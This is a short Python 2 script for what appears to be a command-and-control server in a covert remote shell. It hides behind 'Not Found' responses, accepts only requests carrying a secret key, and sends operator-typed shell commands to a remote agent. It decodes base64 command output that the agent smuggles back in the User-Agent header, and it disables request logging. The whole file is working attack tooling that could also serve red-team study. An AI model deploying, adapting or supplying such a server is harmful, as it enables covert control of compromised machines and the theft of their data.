#!/usr/bin/python

from uuid import uuid4
from urlparse import urlparse, parse_qs
from BaseHTTPServer import BaseHTTPRequestHandler,HTTPServer

serverPort = 80
secretkey = str(uuid4())

class webServer(BaseHTTPRequestHandler):

    def do_GET(self,):
        useragent = self.headers.get('User-Agent').split('|')
        querydata = parse_qs(urlparse(self.path).query)
        if 'key' in querydata:
            if querydata['key'][0] == secretkey:
                self.send_response(200)
                self.send_header("Content-type","text/html")
                self.end_headers()

                if len(useragent) == 2:
                    response = useragent[1].split(',')[0]
                    print(response.decode("base64"))
                    self.wfile.write("Not Found")
                    return
                cmd = raw_input("$ ")
                self.wfile.write("STARTCOMMAND{}ENDCOMMAND".format(cmd))
                return
        self.send_response(404)
        self.send_header("Content-type","text/html")
        self.end_headers()
        self.wfile.write("Not Found")
        return

    def log_message(self, format, *args):
        return

try:
    server = HTTPServer(("", serverPort), webServer)
    print("Server running on port: {}".format(serverPort))
    print("Secret Key: {}".format(secretkey))
    server.serve_forever()
except KeyboardInterrupt:
    server.socket.close()


